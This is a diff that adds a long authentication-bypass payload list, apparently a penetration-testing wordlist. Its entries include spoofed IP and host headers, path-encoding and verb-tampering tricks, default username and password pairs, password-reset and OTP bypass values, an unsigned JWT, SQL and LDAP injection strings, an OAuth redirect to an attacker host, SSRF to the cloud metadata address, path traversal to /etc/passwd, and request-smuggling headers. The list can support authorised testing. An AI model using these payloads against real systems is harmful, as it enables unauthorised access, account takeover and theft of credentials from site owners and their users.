@@ -45,3 +45,226 @@ X-Original-URL: /admin
 X-Rewrite-URL: /admin
 X-Originating-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Host: localhost
+X-Forwarded-Host: localhost
+
+# URL path manipulation
+/admin/..;/
+/admin/%2e%2e%3b/
+/./admin/./
+/admin;/
+/admin..
+//admin//
+/./admin/./panel
+/%2e/admin
+/admin/~
+/admin#
+/admin?
+
+# HTTP verb tampering
+GET /admin
+POST /admin
+HEAD /admin
+PUT /admin
+DELETE /admin
+OPTIONS /admin
+TRACE /admin
+PATCH /admin
+
+# Case manipulation
+/Admin
+/ADMIN
+/AdMiN
+/aDmIn
+
+# Unicode bypass
+/admin%c0%af
+/admin%e0%80%af
+/admin%c0%ae%c0%ae/
+/%61dmin
+
+# Double encoding
+/%252e%252e%252fadmin
+/%252e%252e/admin
+
+# Null byte injection
+/admin%00
+/admin%00.html
+/admin%00.jpg
+
+# Credential stuffing patterns
+admin:admin
+administrator:administrator
+root:root
+admin:password
+admin:123456
+admin:admin123
+test:test
+guest:guest
+user:user
+demo:demo
+
+# Default credentials bypass
+username=admin&password=
+username=&password=
+username=admin&password=%20
+username=admin&password=*
+
+# Password reset bypass
+email=victim@example.com&email=attacker@example.com
+token=&email=attacker@example.com
+token=0
+token=null
+token=false
+
+# OTP/2FA bypass
+otp=000000
+otp=123456
+otp=111111
+otp=
+otp=%20
+otp=null
+
+# Response manipulation
+# Change HTTP response from 401/403 to 200
+# Change "authenticated": false to "authenticated": true
+# Change "role": "user" to "role": "admin"
+
+# JWT manipulation (see JWT-Vulnerabilities for more)
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+Authorization: Bearer null
+Authorization: Bearer 
+Authorization: 
+
+# GraphQL authentication bypass
+{"query":"mutation{login(username:\"admin\",password:\"' OR '1'='1\"){token}}"}
+{"query":"{users{id username password}}"}
+
+# XML authentication bypass
+<user><username>admin</username><password>' OR '1'='1</password></user>
+
+# LDAP authentication bypass
+username=*
+username=admin)(|(password=*
+username=*)(uid=*))(|(uid=*
+
+# OAuth/OIDC bypass
+redirect_uri=https://attacker.com
+state=
+nonce=
+code=
+
+# API key bypass
+api_key=
+X-API-Key: 
+Authorization: 
+apikey=null
+
+# Session fixation
+PHPSESSID=attacker_controlled_session
+jsessionid=12345
+
+# CAPTCHA bypass
+captcha=
+g-recaptcha-response=
+h-captcha-response=
+captcha_response=03AAYGu2...
+recaptcha=
+
+# Rate limiting bypass
+X-Forwarded-For: random_ip_each_request
+X-Originating-IP: random_ip_each_request
+X-Remote-IP: random_ip_each_request
+
+# Account enumeration
+username=admin&password=wrong
+username=nonexistent&password=wrong
+
+# Login form variations
+user[admin]=1
+user[role]=admin
+username[]=admin
+password[]=anything
+
+# Time-based bypass
+wait_for_rate_limit=true
+timestamp=future_date
+valid_until=9999999999
+
+# Magic hashes (PHP type juggling)
+# 0e215962017 == 0 (PHP)
+# 0e291242476940776845150308577824 == 0
+password=0e215962017
+password=240610708
+
+# Unicode normalization
+username=ⓐⓓⓜⓘⓝ
+username=𝒶𝒹𝓂𝒾𝓃
+username=ａｄｍｉｎ
+
+# Homograph attack
+username=αdmin (Greek alpha)
+username=аdmin (Cyrillic а)
+
+# Whitespace bypass
+username= admin
+username=admin 
+username=%20admin
+username=admin%20
+
+# Special characters
+username=admin'
+username=admin"
+username=admin`
+username=admin\
+
+# Email bypass for authentication
+email=admin@localhost
+email=admin@127.0.0.1
+email=@example.com
+email=victim@attacker.com
+
+# Host header authentication bypass
+Host: localhost
+Host: 127.0.0.1
+Host: internal.company.com
+
+# Referer bypass
+Referer: https://trusted-site.com
+Referer: https://localhost
+
+# Origin bypass
+Origin: https://trusted-site.com
+Origin: null
+
+# Authentication via GET instead of POST
+GET /api/login?username=admin&password=admin123
+
+# File inclusion for authentication bypass
+/etc/passwd
+../../../../../../etc/passwd
+
+# SSRF to bypass authentication
+url=http://localhost/admin
+url=http://127.0.0.1/admin
+url=http://169.254.169.254/latest/meta-data/
+
+# Request smuggling for authentication bypass
+Content-Length: 0
+Transfer-Encoding: chunked
+
+# Race conditions
+# Send multiple authentication requests simultaneously
+
+# Business logic bypass
+step=1&step=3
+status=pending&status=approved
+verified=false&verified=true
+
+# Broken authentication chain
+# Skip step 2 in multi-step authentication
+# Reuse old session tokens
+# Replay old authentication requests
